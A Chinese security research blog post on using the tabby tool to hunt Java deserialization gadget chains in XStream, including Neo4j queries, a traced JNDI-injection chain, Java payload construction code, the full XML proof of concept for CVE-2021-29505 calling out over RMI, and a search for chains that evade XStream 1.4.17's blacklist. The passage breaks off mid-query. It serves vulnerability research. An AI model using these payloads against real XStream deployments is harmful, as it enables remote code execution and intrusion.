<!DOCTYPE html><html lang="en" theme-mode="auto"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>XStream与tabby | RacerZ</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.6.1/MathJax.js"></script><script>MathJax.Hub.Config({
 menuSettings: {
   zoom: "None"
 },
 showMathMenu: false,
 jax: ["input/TeX","output/CommonHTML"],
 extensions: ["tex2jax.js"],
 TeX: {
   extensions: ["AMSmath.js","AMSsymbols.js"],
   equationNumbers: {
     autoNumber: "AMS"
   }
 },
 tex2jax: {
   inlineMath: [["\\(", "\\)"]],
   displayMath: [["\\[", "\\]"]]
 }
});</script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light' || window.matchMedia('(prefers-color-scheme:light)').matches) document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark' || window.matchMedia('(prefers-color-scheme:dark)').matches) document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>XStream与tabby</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-11-09T16:00:00.000Z" id="date"> 2022-11-10</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2022-11-25T16:06:03.796Z" id="updated"> 2022-11-26</time></div></span></div></div><hr><div id="post-content"><h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>tabby熟悉便从作者的xstream挖掘cve开始</p>
<p>给出一个tabby查询模板</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs neo4j">match (source:Method) // 添加where语句限制source函数<br>match (sink:Method &#123;IS_SINK:true&#125;) // 添加where语句限制sink函数<br>call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 12) yield path // 查找具体路径,12代表深度，可以修改<br>return * limit 20<br></code></pre></td></tr></table></figure>
<p>根据作者的一条链子，我们直接增加限制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">match (source:Method &#123;NAME:&quot;compare&quot;&#125;)<br>match (sink:Method &#123;IS_SINK:true, NAME:&quot;invoke&quot;&#125;)&lt;-[:CALL]-(m1:Method &#123;NAME: &quot;createValue&quot;&#125;)<br>call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 12) yield path <br>return * limit 20<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117101918598.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117101918598.png" alt="image-20221117101918598"></p>
<p>关键调用sink点的函数为<code>sun.swing.SwingLazyValue#createValue()</code></p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117102027338.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117102027338.png" alt="image-20221117102027338"></p>
<p>该函数可以看到可以导入一个任意类并调用其静态函数或者构造函数，其中的类名、方法名以及参数名均可控</p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117102237468.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117102237468.png" alt="image-20221117102237468"></p>
<p>通过查询，下面这个类的静态函数可以直接JNDI注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs neo4j">match (source:Method &#123;IS_PUBLIC:true, IS_STATIC:true&#125;)<br>match (sink:Method &#123;IS_SINK: true, NAME:&quot;lookup&quot;&#125;)<br>call apoc.algo.allSimplePaths(sink, source, &quot;&lt;CALL|ALIA&quot;, 8) yield path<br>return path limit 20<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117150159330.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117150159330.png" alt="image-20221117150159330"></p>
<p><code>&lt;javax.naming.InitialContext: java.lang.Object doLookup(java.lang.String)&gt;</code></p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105300053.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105300053.png" alt="image-20221117105300053"></p>
<p>往上回溯调用链，定位<code>javax.swing.UIDefaults#getFromHashtable()</code></p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105424714.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105424714.png" alt="image-20221117105424714"></p>
<p>这里value值可以手动填充，并且可以直接构造成<code>sun.swing.SwingLazyValue</code>就能够执行createValue方法</p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105652123.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105652123.png" alt="image-20221117105652123"></p>
<p>继续往上回溯<code>javax.swing.UIDefaults#get</code>，这里没有阻碍点</p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105811425.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117105811425.png" alt="image-20221117105811425"></p>
<p><code>javax.swing.MultiUIDefaults#get</code>，这里我jdk就没有扫到了不知道为啥，先看下。这里既可以通过替换类属性tables，也可以直接替换hashtable本身的value值</p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117112237729.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117112237729.png" alt="image-20221117112237729"></p>
<p><code>javax.swing.MultiUIDefaults#toString</code>，这里会遍历table中的key，所以一定会触发get</p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117112405268.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117112405268.png" alt="image-20221117112405268"></p>
<p>继续往上找调用了toString的链子。从头开始分析，<code>javax.naming.ldap.Rdn$RdnEntry#compareTo</code>，类属性调用了equals方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs neo4j">match (source:Method) where source.NAME in [&quot;compareTo&quot;]<br>match (sink:Method &#123;NAME:&quot;toString&quot;&#125;)&lt;-[r:CALL]-(m1:Method) where r.REAL_CALL_TYPE in [&quot;java.lang.Object&quot;]<br>call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 5) yield path<br>return path limit 20<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117153028061.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117153028061.png" alt="image-20221117153028061"></p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113642917.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113642917.png" alt="image-20221117113642917"></p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113806220.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113806220.png" alt="image-20221117113806220"></p>
<p><code>com.sun.org.apache.xpath.internal.objects.XString#equals()</code></p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113937702.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221117113937702.png" alt="image-20221117113937702"></p>
<p>贴一下整个调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">javax.naming.ldap.Rdn$RdnEntry.compareTo ??<br>    com.sun.org.apache.xpath.internal.objects.XString.equal<br>        javax.swing.MultiUIDefaults.toString ??<br>            UIDefaults.get ??<br>                UIDefaults.getFromHashTable<br>                    UIDefaults$LazyValue.createValue<br>                    SwingLazyValue.createValue<br>                        javax.naming.InitialContext.doLookup()<br></code></pre></td></tr></table></figure>
<p>因此关键构造如下所示</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br><span class="hljs-type">Object</span> <span class="hljs-variable">multiUIDefaults</span> <span class="hljs-operator">=</span><br>  ReflectionHelper.newInstance(<span class="hljs-string">&quot;javax.swing.MultiUIDefaults&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>[]&#123;uiDefaults&#125;&#125;);<br>uiDefaults.put(<span class="hljs-string">&quot;lazyValue&quot;</span>, obj);<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">rdnEntry1</span> <span class="hljs-operator">=</span> ReflectionHelper.newInstance(<span class="hljs-string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>, <span class="hljs-literal">null</span>);<br>ReflectionHelper.setFieldValue(rdnEntry1, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;ysomap&quot;</span>);<br>ReflectionHelper.setFieldValue(rdnEntry1, <span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;test&quot;</span>));<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">rdnEntry2</span> <span class="hljs-operator">=</span> ReflectionHelper.newInstance(<span class="hljs-string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>, <span class="hljs-literal">null</span>);<br>ReflectionHelper.setFieldValue(rdnEntry2, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;ysomap&quot;</span>);<br>ReflectionHelper.setFieldValue(rdnEntry2, <span class="hljs-string">&quot;value&quot;</span>, multiUIDefaults);<br><br><span class="hljs-keyword">return</span> PayloadHelper.makeTreeSet(rdnEntry2, rdnEntry1);<br></code></pre></td></tr></table></figure>
<h4 id="基于XStream-1-4-16-CVE-2021-29505的探索"><a href="#基于XStream-1-4-16-CVE-2021-29505的探索" class="headerlink" title="基于XStream-1.4.16 CVE-2021-29505的探索"></a>基于XStream-1.4.16 CVE-2021-29505的探索</h4><p>先看看<strong>CVE-2021-29505</strong></p>
<p>poc</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">unserializable-parents</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">size</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">size</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>12345<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">m__obj</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;string&#x27;</span>&gt;</span>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: none<span class="hljs-tag">&lt;/<span class="hljs-name">m__obj</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>12345<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27;</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">message</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">parsedMessage</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">parsedMessage</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">soapVersion</span>&gt;</span>SOAP_11<span class="hljs-tag">&lt;/<span class="hljs-name">soapVersion</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">bodyParts</span>/&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">sm</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">attachmentsInitialized</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">attachmentsInitialized</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">multiPart</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">soapPart</span>/&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">mm</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">it</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">aliases</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">candidates</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">names</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">names</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">ctx</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">environment</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">registry</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27;</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">java.rmi.server.RemoteObject</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>UnicastRef<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>127.0.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>2333<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">long</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">long</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">long</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">long</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">short</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">short</span>&gt;</span><br>                                                        <span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;/<span class="hljs-name">java.rmi.server.RemoteObject</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">registry</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">host</span>&gt;</span>127.0.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">host</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span>2333<span class="hljs-tag">&lt;/<span class="hljs-name">port</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">ctx</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">candidates</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">aliases</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">it</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">mm</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">multiPart</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">sm</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221118200924654.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221118200924654.png" alt="image-20221118200924654"></p>
<p>本质是在<code>RegistryImpl_Stub</code>反序列化，会先还原父类，调用<code>`RemoteObject#readObject</code>。其最终会有一个JRMP的连接请求产生。即source点为<code>RemoteObject#readObject()</code></p>
<p>即简化调用链为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sun.rmi.registry.RegistryImpl_Stub#readObject<br>sun.rmi.server.UnicastRef#readExternal<br># trigger rmi<br></code></pre></td></tr></table></figure>
<h4 id="XStream-1-4-17限制"><a href="#XStream-1-4-17限制" class="headerlink" title="XStream 1.4.17限制"></a>XStream 1.4.17限制</h4><ol>
<li><p>黑名单正则</p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113034467.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113034467.png" alt="image-20221119113034467"></p>
</li>
<li><p>黑名单</p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113204066.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113204066.png" alt="image-20221119113204066"></p>
</li>
<li><p>黑名单继承对象</p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113227430.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113227430.png" alt="image-20221119113227430"></p>
</li>
</ol>
<p>CVE-2021-29505的调用链如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">javax.naming.ldap.Rdn$RdnEntry#compareTo <br>com.sun.org.apache.xpath.internal.objects.XString#equal <br>com.sun.xml.internal.ws.api.message.Packet#toString <br>com.sun.xml.internal.ws.message.saaj.SAAJMessage#copy<br>com.sun.xml.internal.ws.message.saaj.SAAJMessage#getAttachments<br>com.sun.xml.internal.ws.message.saaj.SAAJMessage$SAAJAttachmentSet#&lt;init&gt;<br>com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl#getAttachments<br>com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl#initializeAllAttachments<br>com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#getCount<br>com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#parse<br>com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart#parseAll<br>com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#getAttachments<br>com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#parseAll <br>com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage#makeProgress <br>com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator#hasNext <br>com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator#findNextCert<br>com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl#nextElement ==拉黑==<br>com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl#findNextMatch ==拉黑==<br>com.sun.jndi.rmi.registry.BindingEnumeration#next <br>sun.rmi.registry.RegistryImpl_Stub#lookup ==拉黑==<br></code></pre></td></tr></table></figure>
<p>因此，前半部分仍然是可利用的，起点即从<code>findNextCert()</code>开始找</p>
<p class='item-img' data-src='/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113821197.png'><img src="/2022/11/10/xstream%E4%B8%8Etabby/image-20221119113821197.png" alt="image-20221119113821197"></p>
<p>我们可以利用<code>aliases</code>属性延续后面链子的查找。</p>
<p>其中类需要满足的性质</p>
<ol>
<li>实现了<code>Enumeration</code>接口</li>
<li>拥有<code>nextElement()</code>函数，并且最终能到达恶意sink函数</li>
<li>绕过所有的黑名单</li>
</ol>
<p>针对source点的限制实现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">match (source:Method &#123;NAME:&quot;nextElement&quot;&#125;)<br>&lt;-[:HAS]-(cls:Class)-[:INTERFACE|EXTENDS*]-&gt;(cls1:Class &#123;NAME:&quot;java.util.Enumeration&quot;&#125;)<br>match (source)-[:CALL]-&gt;(m1:Method)<br></code></pre></td></tr></table></figure>
<p>​    sink点，找可实现JNDI注入的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">match (sink:Method &#123;IS_SINK:TRUE, VUL:&quot;JNDI&quot;&#125;)<br></code></pre></td></tr></table></figure>
<p>增加黑名单过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">match (source:Method &#123;NAME:&quot;nextElement&quot;&#125;)<br>&lt;-[:HAS]-(cls:Class)-[:INTERFACE|EXTENDS*]-&gt;(cls1:Class &#123;NAME:&quot;java.util.Enumeration&quot;&#125;)<br>match (source)-[:CALL]-&gt;(m1:Method)<br>match (sink:Method &#123;IS_SINK:TRUE, VUL:&quot;JNDI&quot;&#125;)<br>call apoc.algo.allSimplePaths(sink, m1, &quot;&lt;CALL|ALIAS&quot;, 8) yield path<br>where none(n in nodes(path) where n.CLASSNAME in [&quot;java.beans.EventHandler&quot;, &quot;java.lang.ProcessBuilder&quot;, &quot;javax.imageio.ImageIO$ContainsFilter&quot;, &quot;jdk.nashorn.internal.objects.NativeString&quot;, &quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;, &quot;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&quot;, &quot;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&quot;, 